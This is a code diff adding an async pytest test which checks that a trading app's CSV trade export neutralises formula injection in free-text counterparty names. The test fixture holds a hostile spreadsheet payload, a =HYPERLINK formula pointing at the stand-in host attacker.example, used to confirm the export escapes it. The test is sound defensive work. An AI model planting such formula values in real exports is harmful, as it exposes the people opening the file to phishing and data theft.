@@ -68,6 +68,62 @@ async def test_export_trades_csv_contains_the_booked_trade(
 
 
 @pytest.mark.asyncio
+async def test_export_trades_csv_neutralizes_formula_injection_in_free_text_fields(
+    client: AsyncClient, db_session: AsyncSession, auth_headers: AuthHeadersFactory
+):
+    """Counterparty.name/Book.name are free text with no length or pattern
+    constraint (CounterpartyCreate/BookCreate) -- a value starting with =/+/-/@
+    would otherwise be interpreted as a formula by Excel/Sheets when an
+    ADMIN/RISK_MANAGER later opens an exported CSV, a classic CSV/formula-injection
+    chain. See ARCHITECTURE.md's "Internal security-review pass"."""
+    trader_headers = await auth_headers(UserRole.TRADER, username="export-formula-trader")
+    risk_headers = await auth_headers(UserRole.RISK_MANAGER, username="export-formula-risk")
+
+    payload_name = '=HYPERLINK("http://attacker.example/steal","Click")'
+    counterparty = Counterparty(name=payload_name)
+    book = Book(name="Formula Injection Book")
+    db_session.add_all([counterparty, book])
+    await db_session.commit()
+
+    trade_resp = await client.post(
+        "/api/v1/trades",
+        json={
+            "trade_date": "2026-01-10",
+            "counterparty_id": str(counterparty.id),
+            "book_id": str(book.id),
+            "trade_type": "SWAP",
+            "buy_sell": "BUY",
+            "volume": 1000,
+            "fixed_price": 3.00,
+            "delivery_start_month": "2026-06-01",
+            "delivery_end_month": "2026-06-01",
+        },
+        headers=trader_headers,
+    )
+    trade_id = trade_resp.json()["id"]
+    await client.post(f"/api/v1/trades/{trade_id}/confirm", headers=risk_headers)
+
+    resp = await client.get(
+        "/api/v1/export/trades", params={"book_id": str(book.id)}, headers=trader_headers
+    )
+    assert resp.status_code == 200
+
+    # The raw wire text has the payload's internal "s CSV-escaped (doubled) because
+    # pandas quotes the whole field once it contains a comma -- so the exact
+    # leading-' + payload string only reappears after parsing it back out, not in
+    # the raw text. What the raw-text check below proves is the one thing that
+    # actually matters: the payload's original, un-prefixed form (which Excel would
+    # read as a bare formula starting at the cell's first character) never appears
+    # verbatim anywhere in the response.
+    assert payload_name not in resp.text
+    assert "'=HYPERLINK(" in resp.text
+
+    df = pd.read_csv(io.StringIO(resp.text))
+    row = df[df["id"] == trade_id].iloc[0]
+    assert row["counterparty"] == f"'{payload_name}"
+
+
+@pytest.mark.asyncio
 async def test_export_trades_json_and_parquet_round_trip(
     client: AsyncClient, db_session: AsyncSession, auth_headers: AuthHeadersFactory
 ):
